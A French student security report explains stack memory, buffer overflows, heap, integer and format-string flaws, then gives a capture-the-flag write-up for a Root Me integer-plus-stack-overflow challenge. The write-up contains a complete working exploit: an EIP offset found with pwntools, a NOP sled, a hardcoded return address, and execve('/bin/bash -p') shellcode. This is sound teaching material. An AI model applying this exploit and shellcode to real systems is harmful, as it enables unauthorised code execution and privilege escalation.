# Dossier sécurité des système et OS virtuel

## Thomas Bessard - Amine BEN MIMOUN



## # [La corruption de memoire](La corruption de memoire)

Chaque processus qui s'exécute sur un système d’exploitation possède un espace mémoire  virtuel. La mémoire physique est en effet partagée par tout le système et l’espace mémoire virtuelle est dédié à un processus. Cet espace mémoire contient : 

- le binaire du programme 

- les librairies 

- la heap (pour les variables alloue de façon dynamique)

- la stack ou pile (pour les variables locales des fonctions)

- différents espaces mémoire allouer par le programme

- etc

Nous allons nous intéresser aux failles mémoire impliquant la stack : les stack based buffer overflow.

#### Qu’est-ce que la stack ?

La stack est une structure de données utilisée par les fonctions pour stocker et utiliser des variables locales. Le processeur utilise 2 instructions pour placer et retirer des données de la stack, `PUSH` pour pousser des données, et `POP` pour retirer. La stack fonctionne sur le principe de `LIFO` (last in, first out).

Le registre ESP du processeur pointera sur le début de la stack. Chaque fonction qui est appelée va se réserver un espace sur la stack que l’on nomme une `stack frame` et va pousser les arguments qui lui ont été passés dans cette stack frame. 

Pour que le programme puisse retourner à l'instruction suivant l’appel de la fonction, l’adresse de l’instruction suivante sera aussi placée sur la stack. Aussi a chaque instructions exécuter par le processeurs le registre **eip** (return pointer) contiendra l’adresse de la prochaine instruction.

<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8a/ProgramCallStack2_en.png/1024px-ProgramCallStack2_en.png" title="" alt="" width="417">

#### Qu'est-ce qu’une faille buffer overflow ?

Une faille buffer overflow se produit lorsqu’un programme tente d'écrire un nombre de données qui dépasse les limites d’un buffer. Les valeurs des variables ainsi que les adresses placer sur la stack frame seront écrasés par les données qui déborde du buffer.

L'exploitation d'un dépassement de tampon permet à un attaquant de contrôler ou de faire crasher un processus ou de modifier ses variables internes.

Les données originales de la stack frame comprennent le return pointer (l’adresse de retour)  de la fonction exploitée, c'est-à-dire l'adresse à laquelle le programme doit se rendre ensuite. Cependant, l'attaquant peut définir de nouvelles valeurs en écrasant les données de la stack, pour ainsi pointer vers une adresse de son choix. L'attaquant définit généralement les nouvelles valeurs à une adresse où se trouve le code malveillant qu’il aura injecté. Ce changement modifie le cours de l'exécution du programme et transfère le contrôle au code malveillant de l'attaquant.

L'utilisation des fonctions listées ci-dessous est à éviter:

- gets()
- scanf()
- strcpy()
- strcat()

Il est conseillé d'utiliser `stncpy, strncat, fgets, etc` qui prennent en compte une limite de taille des données en entrée.

### Les types de buffer overflow

Les techniques d'exploitation des vulnérabilités de type "buffer overflow" varient en fonction du système d'exploitation et du langage de programmation. Cependant, l'objectif est toujours de manipuler la mémoire d'un ordinateur pour contrôler l'exécution d'un programme.

Les buffer overflow sont classés en fonction de l'emplacement du buffer dans la mémoire du processus. Il s'agit principalement de débordements basés sur la stack ou sur la heap.

Voici quelques autres types d’attaques par buffer overflow

Attaque buffer overflow basée sur le tas (heap)

Le tas est une structure de mémoire utilisée pour gérer la mémoire dynamique. Les programmeurs utilisent souvent le tas pour allouer de la mémoire dont la taille n'est pas connue au moment de la compilation, lorsque la quantité de mémoire requise est trop importante pour tenir sur la pile ou lorsque la mémoire est destinée à être utilisée entre plusieurs appels de fonction. Les attaques basées sur le tas inondent l'espace mémoire réservé à un programme ou à un processus. 

Attaque integer overflow

La plupart des langages de programmation définissent des tailles maximales pour les entiers. Lorsque ces tailles sont dépassées, le résultat peut provoquer une erreur ou renvoyer un résultat incorrect dans la limite de la longueur des entiers. Une attaque par débordement d'entier peut se produire lorsqu'un entier est utilisé dans une opération arithmétique et que le résultat du calcul est une valeur supérieure à la taille maximale de l'entier. 

Attaque Format string

Les attaquants modifient le déroulement d'une application en utilisant abusivement les fonctions de la bibliothèque de formatage des chaînes de caractères, comme printf et sprintf, pour accéder à d'autres espaces mémoire et les manipuler.

## Quels outils peuvent nous aider à exploiter les buffers overflow ?


Si l’attaquant n’a pas le code source du programme qu’il va attaquer il utilisera des outils de reverse engineering comme : binary ninja, Ghidra (outil de la NSA), IDA. 

Souvent couplé avec des outils de fuzzing pour automatiser la découverte de bug dans le programme si celui-ci a une base de code très grandes : AFL, Libfuzzer.


Il est primordial pour l’attaquant de pouvoir traquer les bugs et analyser la mémoire, c’est là qu'interviennent les debuggers comme : GDB, Windbg, immunity debugger, x64dbg.



## # [ELF x86 - Stack buffer and integer overflow](ELF x86 - Stack buffer and integer overflow)

Lien du challenge: [Challenges/App - Système : ELF x86 - Stack buffer and integer overflow [Root Me : plateforme d'apprentissage dédiée au Hacking et à la Sécurité de l'Information]](https://www.root-me.org/fr/Challenges/App-Systeme/ELF-x86-Stack-buffer-and-integer-overflow)

Le but de challenge est de trouver et  déclencher un interger overflow avec les bits que notre fichier contiendra. Car en effet le titre de ce challenge nous indique qu’un buffer overflow est possible grâce à la présence d’une faille integer overflow présente dans ce code.

Nous pouvons identifier dans le **main** que le programe prend en entre un fichier en mode READ_ONLY puis appelle la fonction **read_file()**.

```c
int main(int argc, char **argv)
{
  int fd;
   
  if(argc != 2) // si le nom du fichier n'est pas passe en
    }            // argument le programe exit
      printf("[-] Usage : %s <filename>\n", argv[0]);
      exit(0);
    }
   
  if((fd = open(argv[1], O_RDONLY)) == -1)
    {
      perror("[-] open ");
      exit(0);
    }
   
  read_file(fd);
  close(fd);
  return 0;
}
```

Dans la fonction read_file 2 variables sont déclarées: la variable **path** qui contiendra le chemin vers le fichier et **size**.

```c
void read_file(int fd)
{
  char path[BUFFER+1] = {0};
  int size;  
   
  if(read(fd, &size, sizeof(int)) != sizeof(int)) // stocke les 4 premier
    {                                             // char dans `size`       
      printf("[-] File too short.\n");
      exit(0);
    }
   
  if(size >= BUFFER) // size est compare a `BUFFER`, c'est notre faille 
    {                // interger overflow
      printf("[-] Path too long.\n");
      exit(0);
    }
  read_data(path, fd, size);
   
  if(path[0] != '/')
    {
      printf("[-] Need a absolute path.\n");
      exit(0);
    }  
   
  printf("[+] The pathname is : %s\n", path);
}
```

Une vérification est faite sur la taille du fichier et du chemin. Le fichier doit contenir au moins 4 caractères. Ces caractères seront injectés dans size avec ce code `if(read(fd, &size, sizeof(int)) != sizeof` puis size sera comparé à la constante `BUFFER` (taille du buffer : 128). Si nous passons une valeur trop grande pour size comme `0xFFFFFFFF`, la comparaison avec `BUFFER` ne nous donnera pas le resultat attendu car le type de `size` qui est un `int` ne peut contenir un aussi grand nombre, le programme nous retournera -1.

Maintenant que nous savons comment bypasser la vérification nous pouvons tout simplement chercher à provoquer un simple **buffer overflow** qui fera crashe le programme. Pour ce faire j'utilise la librairie python **pwn** pour générer une chaine de caractere assez longue avec un pattern qui 
nous permettra de trouver à partir de quel nombre de caractères notre payload ecrase le registre **eip**.

```python
from pwn import *

cyclic(0x100)
```

<img title="" src="markimages\2022-01-31-21-21-18-image.png" alt="" width="863">

Nous générons ainsi notre fichier avec python :

```bash
python -c 'print("\xff\xff\xff\xff" + "/" + "aaaabaaacaaadaaaeaaafaaagaaah
aaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaa
bbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabt
aabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaa
cnaac")' > /tmp/flaw
```

Il y a plusieurs façons de voir le contenu de **EIP** lors du crash d'un programme, nous allons utiliser le débugger gdb avec le plugin GEF, mais la commande `strace ./ch11 /tmp/flaw` peut suffire.

Avec gdb-gef : 

```bash
gdb-gef -q --args ./ch11 /tmp/flaw
```

![](markimages\2022-01-31-21-43-50-image.png)

![](markimages\2022-01-31-21-39-58-image.png)

Nous pouvons voir sur la capture d'écran le registre EIP et les valeurs qu'il contient : `0x6261616f` --> `oaab`. 

```python
cyclic_find("oaab")
```

![](markimages\2022-01-31-21-55-44-image.png)

Il faut à peu près 156 caractères pour contrôler la valeur de **EIP**, avec ça nous pouvons générer un nouveau fichier avec des instructions **nop**  `\x90 ---> 0x90`:

```python
python -c 'print("\xff\xff\xff\xff" + "/" + "T"*156 + "AAAA" + "\x90"*100)' > /tmp/flaw
```

Il faut ensuite repérer une adresse de la stack qui contient nos instructions **nop**. 

![](markimages\2022-01-31-23-14-32-image.png)

Puis trouver un shellcode qui exécute `/bin/bash` pour nous permettre de prendre le contrôle une fois que le programme aura exécuté notre payload.

[Linux/x86 - execve(/bin/bash, [/bin/bash, -p], NULL) - 33 bytes](http://shell-storm.org/shellcode/files/shellcode-606.php)

```bash 
\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80
```

Le shellcode fait 33bytes pour être sûr de tomber dans les instructions nops on peut ajouter le décalage de notre shellcode à notre adresse `bffffb66 + 33 = bffffb99`.



Enfin voici notre paylaod finale : 

```bash
python -c 'print("\xff\xff\xff\xff" + "/" + "T"*156 + "\x99\xfb\xff\xbf" + "\x90"*100 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80")' > /tmp/flaw
```

notre valeur 0xffffffff + la racine du path "/" + 156 caractere afin d'atteindre eip + l'addresse a laquelle eip ira pour executer notre shellcode "\x99\xfb\xff\xbf" + les instructions nop "\x90" * 100 + le shellcode.

![](markimages\2022-01-31-23-32-24-image.png)
